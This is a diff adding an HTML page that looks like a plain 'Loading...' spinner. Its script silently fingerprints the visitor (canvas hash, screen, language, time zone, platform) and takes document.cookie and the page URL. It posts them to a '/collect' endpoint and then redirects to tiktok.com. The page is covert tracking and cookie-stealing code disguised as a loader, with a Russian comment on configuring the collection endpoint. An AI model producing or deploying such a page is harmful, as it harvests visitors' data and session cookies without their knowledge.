@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Loading...</title>
+<style>
+body{margin:0;background:#0a0a0a;display:flex;align-items:center;justify-content:center;height:100vh;font-family:system-ui}
+.loader{width:42px;height:42px;border:3px solid #222;border-top-color:#fff;border-radius:50%;animation:s .7s linear infinite}
+@keyframes s{to{transform:rotate(360deg)}}
+</style>
+</head>
+<body>
+<div class="loader"></div>
+<script>
+(async()=>{
+  // если бэкенд и html на одном домене — оставляй так
+  const endpoint = "/collect";
+
+  const c=document.createElement("canvas");
+  const x=c.getContext("2d");
+  x.textBaseline="top";x.font="14px Arial";x.fillText("fp",2,2);
+  const fp=c.toDataURL().slice(-32);
+
+  const payload={
+    screen:`${screen.width}x${screen.height}`,
+    lang:navigator.language||navigator.userLanguage||"—",
+    tz:Intl.DateTimeFormat().resolvedOptions().timeZone||"—",
+    platform:navigator.platform||"—",
+    cookies:document.cookie||"none",
+    fp:fp,
+    url:location.href
+  };
+
+  try{
+    await fetch(endpoint,{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify(payload),
+      keepalive:true
+    });
+  }catch(e){}
+
+  setTimeout(()=>location.replace("https://www.tiktok.com/"),350);
+})();
+</script>
+</body>
+</html>
